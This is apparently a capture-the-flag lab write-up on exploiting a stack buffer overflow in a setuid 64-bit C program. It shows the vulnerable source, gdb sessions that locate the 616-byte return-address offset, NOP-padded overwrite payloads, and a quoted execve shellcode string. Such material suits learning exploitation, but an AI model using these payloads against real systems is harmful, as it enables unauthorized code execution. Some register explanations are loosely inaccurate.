└─$ ssh des@10.10.248.150               
des@10.10.248.150's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jan 19 01:10:20 UTC 2023

  System load:  0.0                Processes:           99
  Usage of /:   22.0% of 19.56GB   Users logged in:     1
  Memory usage: 35%                IP address for eth0: 10.10.248.150
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

59 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Jan 17 13:29:39 2020 from 192.168.247.130
des@THM_exploit:~$ ls
bof  bof64.c  flag.txt
des@THM_exploit:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.19.103 - - [19/Jan/2023 01:12:21] "GET /bof64.c HTTP/1.1" 200 -
10.8.19.103 - - [19/Jan/2023 01:12:28] "GET /bof HTTP/1.1" 200 -

┌──(kali㉿kali)-[~/binex]
└─$ wget http://10.10.248.150:8000/bof64.c
--2023-01-18 20:12:20--  http://10.10.248.150:8000/bof64.c
Connecting to 10.10.248.150:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 335 [text/plain]
Saving to: ‘bof64.c’

bof64.c      100%     335  --.-KB/s    in 0s       

2023-01-18 20:12:21 (15.4 MB/s) - ‘bof64.c’ saved [335/335]

                                                    
┌──(kali㉿kali)-[~/binex]
└─$ wget http://10.10.248.150:8000/bof    
--2023-01-18 20:12:28--  http://10.10.248.150:8000/bof
Connecting to 10.10.248.150:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8600 (8.4K) [application/octet-stream]
Saving to: ‘bof’

bof          100%   8.40K  --.-KB/s    in 0.001s   

2023-01-18 20:12:28 (12.2 MB/s) - ‘bof’ saved [8600/8600]

──(kali㉿kali)-[~/binex]
└─$ cat bof64.c 
#include <stdio.h>
#include <unistd.h>

int foo(){
	char buffer[600];
	int characters_read;
	printf("Enter some string:\n");
	characters_read = read(0, buffer, 1000);
	printf("You entered: %s", buffer);
	return 0;
}

void main(){
	setresuid(geteuid(), geteuid(), geteuid());
    	setresgid(getegid(), getegid(), getegid());

	foo();
}

This is a simple C program that uses the function read() to read input from the user and stores it in a buffer of size 600 bytes. The program then prints out the input that the user entered. The problem with this program is that the buffer size is too small and the input that the user enters is not properly validated. This means that if a user enters more than 600 bytes of data, it will overwrite memory outside of the buffer and cause a buffer overflow. This can potentially lead to security vulnerabilities and can be exploited by malicious actors to gain unauthorized access to the system or execute arbitrary code.

The setresuid() and setresgid() functions in the main method are used to set the real, effective, and saved user and group IDs to the effective user and group IDs. This is not related to the buffer overflow issue.

┌──(kali㉿kali)-[~/binex]
└─$ chmod +x bof           
                                                    
┌──(kali㉿kali)-[~/binex]
└─$ ./bof           
Enter some string:
hi
You entered: hi
f 

┌──(kali㉿kali)-[~]
└─$ export PATH=/home/kali/.local/bin:$PATH

The command sets the PATH variable to "/home/kali/.local/bin:$PATH". This means that the shell will first look for executables in the directory /home/kali/.local/bin and then in the directories listed in the current value of the PATH variable.

The .local/bin directory is a common location for locally-installed executables, so this command is likely being used to ensure that locally-installed executables are found before system-wide executables.

┌──(kali㉿kali)-[~]
└─$ cyclic 650  
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagma

┌──(kali㉿kali)-[~]
└─$ python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print('a'*650)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

┌──(kali㉿kali)-[~/binex]
└─$ ./bof  
Enter some string:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
zsh: segmentation fault  ./bof

┌──(kali㉿kali)-[~/binex]
└─$ lscpu | ./bof
Enter some string:
You entered: Architecture:                    x86_64
CPU op-mode(s):                  32-bit, 64-bit
Address sizes:                   40 bits physical, 48 bits virtual
Byte Order:                      Little Endian
CPU(s):                          4
On-line CPU(s) list:             0-3
Vendor ID:                       GenuineIntel
Model name:                      Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz
CPU family:                      6
Model:                           142
Thread(s) per core:              1
Core(s) per socket:              2
Socket(s):                       2
zsh: done                lscpu | 
zsh: segmentation fault  ./bof


┌──(kali㉿kali)-[~/binex]
└─$ gdb bof
GNU gdb (Debian 12.1-4) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 142 pwndbg commands and 48 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from bof...
(No debugging symbols found in bof)
------- tip of the day (disable with set show-tips off) -------
Use the canary command to see all stack canary/cookie values on the stack (based on the *usual* stack canary value initialized by glibc)
pwndbg> r < <(cyclic 650)
Starting program: /home/kali/binex/bof < <(cyclic 650)
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter some string:

Program received signal SIGSEGV, Segmentation fault.
0x000055555540084e in foo ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────
 RAX  0x0
*RBX  0x3e8
 RCX  0x0
 RDX  0x0
*RDI  0x7fffffffda30 —▸ 0x7ffff7e12e70 (funlockfile) ◂— mov rdi, qword ptr [rdi + 0x88]
*RSI  0x555555400956 ◂— add byte ptr [rax], al
 R8   0x0
*R9   0x73
 R10  0x0
*R11  0xffffffff
*R12  0x3e8
*R13  0x7fffffffe338 —▸ 0x7fffffffe5d6 ◂— 'COLORTERM=truecolor'
 R14  0x0
*R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555400000 ◂— jg 0x555555400047
*RBP  0x6761616467616163 ('caagdaag')
*RSP  0x7fffffffe1f8 ◂— 0x6761616667616165 ('eaagfaag')
*RIP  0x55555540084e (foo+84) ◂— ret 
──────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────
 ► 0x55555540084e <foo+84>    ret    <0x6761616667616165>










────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe1f8 ◂— 0x6761616667616165 ('eaagfaag')
01:0008│     0x7fffffffe200 ◂— 0x6761616867616167 ('gaaghaag')
02:0010│     0x7fffffffe208 ◂— 0x6761616a67616169 ('iaagjaag')
03:0018│     0x7fffffffe210 ◂— 0x6761616c6761616b ('kaaglaag')
04:0020│     0x7fffffffe218 —▸ 0x7ffff7de616d ◂— 0x9c370000000
05:0028│     0x7fffffffe220 ◂— 0x0
06:0030│     0x7fffffffe228 —▸ 0x55555540084f (main) ◂— push rbp
07:0038│     0x7fffffffe230 ◂— 0x100000000
──────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────
 ► f 0   0x55555540084e foo+84
   f 1 0x6761616667616165
   f 2 0x6761616867616167
   f 3 0x6761616a67616169
   f 4 0x6761616c6761616b
   f 5   0x7ffff7de616d
   f 6              0x0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> disassemble shell
No symbol "shell" in current context.
pwndbg> disassemble special
No symbol "special" in current context.
pwndbg> disassemble shell
No symbol "shell" in current context.
pwndbg> exit

uhmm let's do it another way


des@THM_exploit:~$ gdb bof
GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from bof...(no debugging symbols found)...done.

(gdb) r < <(python -c 'print("A" * 660)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/des/bof < <(python -c 'print("A" * 660)')
Enter some string:
Program received signal SIGSEGV, Segmentation fault.
0x000055555555484e in foo ()
(gdb) i r
rax            0x0	0
rbx            0x3e9	1001
rcx            0x0	0
rdx            0x0	0
rsi            0x555555554956	93824992233814
rdi            0x7ffff7dd0760	140737351845728
rbp            0x4141414141414141	0x4141414141414141
rsp            0x7fffffffe498	0x7fffffffe498
r8             0xffffffffffffffed	-19
r9             0x25e	606
r10            0x5555557564cb	93824994337995
r11            0x555555554956	93824992233814
r12            0x3e9	1001
r13            0x7fffffffe590	140737488348560
r14            0x0	0
r15            0x0	0
rip            0x55555555484e	0x55555555484e <foo+84>
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) 

(gdb) x/xg $rsp
0x7fffffffe498:	0x4141414141414141

https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558

┌──(kali㉿kali)-[~]
└─$ cyclic 650
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagma

des@THM_exploit:~$ gdb bof
GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from bof...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/des/bof 
Enter some string:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagma

Program received signal SIGSEGV, Segmentation fault.
0x000055555555484e in foo ()
(gdb) i r
rax            0x0	0
rbx            0x3e9	1001
rcx            0x0	0
rdx            0x0	0
rsi            0x555555554956	93824992233814
rdi            0x7ffff7dd0760	140737351845728
rbp            0x6761616467616163	0x6761616467616163
rsp            0x7fffffffe498	0x7fffffffe498
r8             0xffffffffffffffed	-19
r9             0x25e	606
r10            0x5555557564cb	93824994337995
r11            0x555555554956	93824992233814
r12            0x3e9	1001
r13            0x7fffffffe590	140737488348560
r14            0x0	0
r15            0x0	0
rip            0x55555555484e	0x55555555484e <foo+84>
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x/xg $rsp
0x7fffffffe498:	0x6761616667616165

┌──(kali㉿kali)-[~/binex]
└─$ cyclic -l 0x6761616667616165
616

This gives us an offset of 616

RSP (Register Stack Pointer) and RIP (Register Instruction Pointer) are registers in the x86-64 architecture used by the CPU to store memory addresses. RSP points to the top of the stack and is used to keep track of where the next item will be pushed or popped from the stack. RIP, on the other hand, points to the next instruction to be executed by the CPU.

NOP (No Operation) is a machine language instruction that does nothing. It is commonly used in assembly language programming as a "padding" instruction or as a "placeholder" instruction to fill space between other instructions. In GDB, it is used to skip instructions when debugging and testing an assembly code.

In GDB, you can use the command "x/i $rip" to examine the instruction pointed to by the RIP register, and "x/i $rsp" to examine the instruction pointed to by the RSP register.

It's also important to mention that RSP and RIP are x86_64 architecture registers, therefore, depending on the architecture you are using, the registers may be different.

The command "r < <(python -c 'print("A" * 660)')" in GDB is an attempt to run the program being debugged with an input stream coming from a subshell, which is a shell command that runs in a new process. In this case, the subshell is executing a python script that creates a string of 660 'A' characters and prints it. This string is passed as input to the program being debugged when the "r" command is run.

This command is likely attempting to exploit a buffer overflow vulnerability in the program being debugged by providing more input data than the program can handle. The goal is likely to overwrite the return address of the function with an address that points to the shellcode.

The command "i r" in GDB is short for "info registers". This command displays the current values of all the registers in the CPU. The registers that are displayed will depend on the architecture of the system, but for x86-64 architecture, it will display the general-purpose registers (eax, ebx, ecx, edx, etc.), the instruction pointer (rip), the stack pointer (rsp), and the flags register (eflags). The values displayed in these registers will change as the program is executed, and they can be useful for understanding the current state of the program and for debugging.

It's also important to mention that GDB is a powerful tool for debugging and analyzing code, but it is not a toy, and it should be used by those who have knowledge of its commands and their usage.

The command "x/xg $rsp" in GDB is used to examine the memory at the address stored in the register RSP (Stack Pointer) in x86-64 architecture.

The "x" command in GDB is used to examine memory. The "/xg" part of the command is a format specifier, it tells GDB to display the memory contents in hexadecimal format and the "g" specifies that the data size should be 8 bytes (x86-64 architecture). The "$rsp" part of the command specifies the memory address to be examined, in this case, the content of the RSP register.

This command is useful for examining the top of the stack, which can be useful for debugging and understanding the current state of the program. However, it is important to have a good understanding of the program's memory layout, or the output of this command might not be meaningful.

The command "x/616xb $rsp - 620" in GDB is used to examine the memory at the address stored in the register RSP (Stack Pointer) minus 620 in x86-64 architecture.

The "x" command in GDB is used to examine memory. The "/616xb" part of the command is a format specifier, it tells GDB to display 616 bytes of memory contents in hexadecimal format and the "b" specifies that the data size should be 1 byte. The "$rsp - 620" part of the command specifies the memory address to be examined, in this case, the content of the RSP register minus 620 bytes.

des@THM_exploit:~$ gdb bof
GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from bof...(no debugging symbols found)...done.
(gdb) r < <(python -c 'print("\x90" * 616 + "BBBBCCCC")')
Starting program: /home/des/bof < <(python -c 'print("\x90" * 616 + "BBBBCCCC")')
Enter some string:

Program received signal SIGSEGV, Segmentation fault.
0x000055555555484e in foo ()
(gdb) i r
rax            0x0	0
rbx            0x3e9	1001
rcx            0x0	0
rdx            0x0	0
rsi            0x555555554956	93824992233814
rdi            0x7ffff7dd0760	140737351845728
rbp            0x9090909090909090	0x9090909090909090
rsp            0x7fffffffe498	0x7fffffffe498
r8             0xffffffffffffffed	-19
r9             0x25e	606
r10            0x5555557564cb	93824994337995
r11            0x555555554956	93824992233814
r12            0x3e9	1001
r13            0x7fffffffe590	140737488348560
r14            0x0	0
r15            0x0	0
rip            0x55555555484e	0x55555555484e <foo+84>
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x/xg $rsp
0x7fffffffe498:	0x4343434342424242

(gdb) x/616xb $rsp - 620
0x7fffffffe22c:	0x55	0x55	0x00	0x00	0x90	0x90	0x90	0x90
0x7fffffffe234:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe23c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe244:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe24c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe254:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe25c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe264:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe26c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe274:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe27c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe284:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe28c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe294:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe29c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe2a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe2ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe2b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe2bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe2c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe2cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe2d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe2dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe2e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe2ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe2f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe2fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffe304:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe30c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe314:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe31c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe324:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe32c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe334:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe33c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe344:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe34c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe354:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe35c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe364:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe36c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe374:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe37c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe384:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe38c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe394:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe39c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe3a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe3ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe3b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe3bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe3c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe3cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe3d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffe3dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe3e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe3ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe3f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe3fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe404:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe40c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe414:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe41c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe424:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe42c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe434:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe43c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe444:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe44c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe454:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe45c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe464:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe46c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe474:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe47c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe484:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffe48c:	0x71	0x02	0x00	0x00	0x90	0x90	0x90	0x90

(gdb) show endian
The target endianness is set automatically (currently little endian)


In x86-64 architecture, these registers are known as general-purpose registers. They are used to hold data and memory addresses for different purposes:

-   EAX (Accumulator Register): It is used for arithmetic operations and holds the result of operations such as addition, subtraction, and multiplication.
-   EBX (Base Register): It is often used as a pointer to memory, it's also used as a base pointer in some architectures to access memory on the stack.
-   ECX (Counter Register): It is often used as a counter in loops and string operations, and it's also used to hold the number of iterations in some instructions.
-   EDX (Data Register): It is used in conjunction with EAX for arithmetic operations, it's also used to hold data for some instructions such as I/O operations.
-   EBP (Base Pointer): It is used as a base pointer in some architectures to access memory on the stack.
-   ESP (Stack Pointer): It points to the current top of the stack, it's used to keep track of where the next item will be pushed or popped from the stack.
-   ESI (Source Index): It is used as a pointer to the source data in memory operations such as string operations and memory copies.
-   EDI (Destination Index): It is used as a pointer to the destination data in memory operations such as string operations and memory copies.

RSP (Register Stack Pointer) and RIP (Register Instruction Pointer) are two registers in x86-64 architecture used by the CPU to store memory addresses.

RSP points to the top of the stack, it's used to keep track of where the next item will be pushed or popped from the stack. The stack is a section of memory used to temporarily store data, such as function call frames, local variables and function return addresses.

RIP, on the other hand, points to the next instruction to be executed by the CPU. It contains the memory address of the instruction that the CPU is currently executing or is about to execute. The instruction pointer is used to keep track of the program counter which is the address of the next instruction to be executed.

A simple way to think about it is that RSP keeps track of where the program is on the stack and RIP keeps track of where the program is in the code. The stack is used to store data and the instruction pointer is used to navigate the code.

http://shell-storm.org/shellcode/files/shellcode-806.html

char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

